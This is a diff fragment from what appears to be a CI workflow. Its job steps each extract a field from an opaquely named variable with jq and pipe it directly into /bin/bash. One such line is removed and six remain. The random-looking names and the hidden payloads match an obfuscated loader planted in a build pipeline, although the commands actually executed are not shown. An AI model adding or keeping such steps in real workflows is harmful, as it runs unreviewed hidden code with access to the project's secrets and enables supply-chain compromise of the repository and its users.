@@ -29,7 +29,6 @@ jobs:
           echo $skic174 | jq -r .bd2130 | /bin/bash
           echo $xqs3 | jq -r .nvrbq7006 | /bin/bash
           printf '%s' "$y94672" | jq -r .xf03 | /bin/bash
-          printf '%s' "$hhe25782" | jq -r .t082 | /bin/bash
           printf '%s' "$n606" | jq -r .u2583 | /bin/bash
           echo $kpwr62933 | jq -r .oziy404 | /bin/bash
           printf '%s' "$mtdm523" | jq -r .i40 | /bin/bash
